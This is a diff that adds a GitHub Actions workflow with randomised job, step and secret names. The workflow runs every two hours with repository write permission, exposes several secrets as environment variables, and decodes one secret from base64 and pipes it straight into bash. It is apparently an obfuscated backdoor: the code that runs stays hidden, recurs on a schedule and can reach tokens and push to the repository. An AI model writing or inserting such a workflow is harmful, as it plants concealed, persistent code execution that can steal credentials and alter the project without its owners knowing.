@@ -1,0 +1,21 @@
+name: tJNmr
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  v5Z7VdQS:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.K7BP7K }}
+      - name: LY6bEHhB9YCEH
+        env:
+          eCo6eD5: ${{ secrets.YrNhHG4pO1GW3 }}
+          t3nZ8omwTl: ${{ secrets.f2pI5P }}
+          wHgKF: ${{ secrets.leGH8bvWj }}
+          GITHUB_TOKEN: ${{ secrets.K7BP7K }}
+        run: echo "$eCo6eD5" | base64 -d | bash
